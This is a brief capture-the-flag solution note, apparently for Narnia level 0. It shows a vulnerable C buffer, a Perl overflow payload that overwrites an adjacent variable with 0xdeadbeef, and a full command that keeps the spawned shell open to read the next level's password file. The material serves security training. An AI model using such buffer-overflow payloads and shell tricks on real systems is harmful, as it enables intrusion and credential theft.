long val=0x41414141;
char buf[20];

if(val==0xdeadbeef){ //win condition

=> overflow buf to write 0xdeadbeef in val

NOTES:

payload: perl -e 'print "B"x20,pack("I",0xdeadbeef)'
use (payload;cat) to keep invoked shell opened
use echo "cmd" at the beginning to exec command in opened shell

SOLUTION:

echo "cat /etc/narnia_pass/narnia1" | (perl -e 'print "B"x20,pack("I",0xdeadbeef)';cat)  | ./narnia0
